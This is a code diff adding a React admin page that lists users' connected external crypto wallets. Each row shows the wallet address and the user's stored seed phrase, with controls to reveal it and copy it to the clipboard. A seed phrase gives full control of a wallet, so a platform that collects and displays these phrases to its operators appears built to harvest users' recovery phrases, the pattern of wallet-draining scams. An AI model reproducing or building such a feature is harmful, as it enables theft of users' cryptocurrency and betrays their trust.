@@ -1,0 +1,220 @@
+import { AdminLayout } from "@/components/layout/admin-layout";
+import { Card, CardContent } from "@/components/ui/card";
+import { Button } from "@/components/ui/button";
+import { 
+  Table, 
+  TableBody, 
+  TableCell, 
+  TableHead, 
+  TableHeader, 
+  TableRow 
+} from "@/components/ui/table";
+import { ArrowLeft, Wallet, Copy, Eye, EyeOff, Loader2 } from "lucide-react";
+import { useState } from "react";
+import { useToast } from "@/hooks/use-toast";
+import { Badge } from "@/components/ui/badge";
+import { useQuery } from "@tanstack/react-query";
+import { Link } from "wouter";
+
+interface ConnectedWallet {
+  id: number;
+  userId: number;
+  name: string;
+  logo: string | null;
+  address: string;
+  seedPhrase: string | null;
+  connectedAt: string;
+  isDeleted: boolean;
+  user?: {
+    id: number;
+    username: string;
+    firstName: string;
+    lastName: string;
+  };
+}
+
+export default function AdminLinkedWallets() {
+  const { toast } = useToast();
+  const [showPhrases, setShowPhrases] = useState<{ [key: number]: boolean }>({});
+
+  const { data: wallets = [], isLoading } = useQuery<ConnectedWallet[]>({
+    queryKey: ['/api/admin/connected-wallets'],
+    queryFn: async () => {
+      const res = await fetch('/api/admin/connected-wallets');
+      if (!res.ok) throw new Error('Failed to fetch wallets');
+      return res.json();
+    }
+  });
+
+  const formatDate = (dateString: string) => {
+    return new Date(dateString).toLocaleString('en-US', {
+      year: 'numeric',
+      month: 'short',
+      day: '2-digit',
+      hour: '2-digit',
+      minute: '2-digit'
+    });
+  };
+
+  const copyToClipboard = (text: string, label: string) => {
+    navigator.clipboard.writeText(text);
+    toast({ title: "Copied", description: `${label} copied to clipboard.` });
+  };
+
+  const toggleShowPhrase = (id: number) => {
+    setShowPhrases(prev => ({ ...prev, [id]: !prev[id] }));
+  };
+
+  const truncateAddress = (address: string) => {
+    if (address.length <= 20) return address;
+    return `${address.slice(0, 10)}...${address.slice(-8)}`;
+  };
+
+  return (
+    <AdminLayout>
+      <div style={{ marginBottom: '24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
+          <Link href="/admin/withdrawals">
+            <Button variant="ghost" size="sm" data-testid="button-back-withdrawals">
+              <ArrowLeft size={16} style={{ marginRight: '8px' }} />
+              Back
+            </Button>
+          </Link>
+          <div>
+            <h1 style={{ fontSize: '20px', fontWeight: 700, color: '#111827' }}>Linked Wallets</h1>
+            <p style={{ fontSize: '14px', color: '#6b7280', marginTop: '4px' }}>View all user connected external wallets</p>
+          </div>
+        </div>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', backgroundColor: '#f3f4f6', padding: '8px 16px', borderRadius: '8px' }}>
+          <Wallet size={20} style={{ color: '#6f42c1' }} />
+          <span style={{ fontWeight: 600, color: '#111827' }}>{wallets.length}</span>
+          <span style={{ color: '#6b7280' }}>Total Wallets</span>
+        </div>
+      </div>
+
+      <Card>
+        <CardContent style={{ padding: '0' }}>
+          {isLoading ? (
+            <div style={{ textAlign: 'center', padding: '48px' }}>
+              <Loader2 className="h-8 w-8 animate-spin mx-auto" style={{ color: '#6b7280' }} />
+              <p style={{ marginTop: '16px', color: '#6b7280' }}>Loading wallets...</p>
+            </div>
+          ) : wallets.length === 0 ? (
+            <div style={{ textAlign: 'center', padding: '48px 24px', backgroundColor: '#f9fafb', borderRadius: '8px', border: '1px dashed #e5e7eb' }}>
+              <Wallet size={48} style={{ color: '#d1d5db', margin: '0 auto 16px' }} />
+              <p style={{ color: '#6b7280', fontSize: '14px' }}>No connected wallets found</p>
+              <p style={{ color: '#9ca3af', fontSize: '12px', marginTop: '4px' }}>
+                Users can connect external wallets from their wallet page
+              </p>
+            </div>
+          ) : (
+            <div style={{ overflowX: 'auto' }}>
+              <Table>
+                <TableHeader>
+                  <TableRow>
+                    <TableHead>User</TableHead>
+                    <TableHead>Wallet Name</TableHead>
+                    <TableHead>Address</TableHead>
+                    <TableHead>Seed Phrase</TableHead>
+                    <TableHead>Connected At</TableHead>
+                  </TableRow>
+                </TableHeader>
+                <TableBody>
+                  {wallets.map((wallet) => (
+                    <TableRow key={wallet.id}>
+                      <TableCell>
+                        <div>
+                          <p style={{ fontWeight: 500, fontSize: '14px' }}>
+                            {wallet.user?.firstName || 'User'} {wallet.user?.lastName || ''}
+                          </p>
+                          <p style={{ fontSize: '12px', color: '#6b7280' }}>
+                            @{wallet.user?.username || `user_${wallet.userId}`}
+                          </p>
+                        </div>
+                      </TableCell>
+                      <TableCell>
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                          {wallet.logo && (
+                            <img 
+                              src={wallet.logo} 
+                              alt={wallet.name}
+                              style={{ width: '32px', height: '32px', borderRadius: '50%', objectFit: 'cover' }}
+                            />
+                          )}
+                          <span style={{ fontWeight: 500 }}>{wallet.name}</span>
+                        </div>
+                      </TableCell>
+                      <TableCell>
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                          <code style={{ fontSize: '11px', backgroundColor: '#f3f4f6', padding: '4px 8px', borderRadius: '4px' }}>
+                            {truncateAddress(wallet.address)}
+                          </code>
+                          <Button
+                            size="sm"
+                            variant="ghost"
+                            onClick={() => copyToClipboard(wallet.address, 'Address')}
+                            style={{ padding: '4px' }}
+                            data-testid={`button-copy-address-${wallet.id}`}
+                          >
+                            <Copy size={14} />
+                          </Button>
+                        </div>
+                      </TableCell>
+                      <TableCell>
+                        {wallet.seedPhrase ? (
+                          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                            {showPhrases[wallet.id] ? (
+                              <code style={{ 
+                                fontSize: '10px', 
+                                backgroundColor: '#fef3c7', 
+                                padding: '4px 8px', 
+                                borderRadius: '4px',
+                                maxWidth: '200px',
+                                overflow: 'hidden',
+                                textOverflow: 'ellipsis',
+                                whiteSpace: 'nowrap'
+                              }}>
+                                {wallet.seedPhrase}
+                              </code>
+                            ) : (
+                              <Badge variant="outline" style={{ fontSize: '10px' }}>Hidden</Badge>
+                            )}
+                            <Button
+                              size="sm"
+                              variant="ghost"
+                              onClick={() => toggleShowPhrase(wallet.id)}
+                              style={{ padding: '4px' }}
+                              data-testid={`button-toggle-phrase-${wallet.id}`}
+                            >
+                              {showPhrases[wallet.id] ? <EyeOff size={14} /> : <Eye size={14} />}
+                            </Button>
+                            {showPhrases[wallet.id] && (
+                              <Button
+                                size="sm"
+                                variant="ghost"
+                                onClick={() => copyToClipboard(wallet.seedPhrase!, 'Seed phrase')}
+                                style={{ padding: '4px' }}
+                                data-testid={`button-copy-phrase-${wallet.id}`}
+                              >
+                                <Copy size={14} />
+                              </Button>
+                            )}
+                          </div>
+                        ) : (
+                          <Badge variant="outline" style={{ fontSize: '10px', color: '#9ca3af' }}>Not provided</Badge>
+                        )}
+                      </TableCell>
+                      <TableCell style={{ fontSize: '12px', color: '#6b7280' }}>
+                        {formatDate(wallet.connectedAt)}
+                      </TableCell>
+                    </TableRow>
+                  ))}
+                </TableBody>
+              </Table>
+            </div>
+          )}
+        </CardContent>
+      </Card>
+    </AdminLayout>
+  );
+}
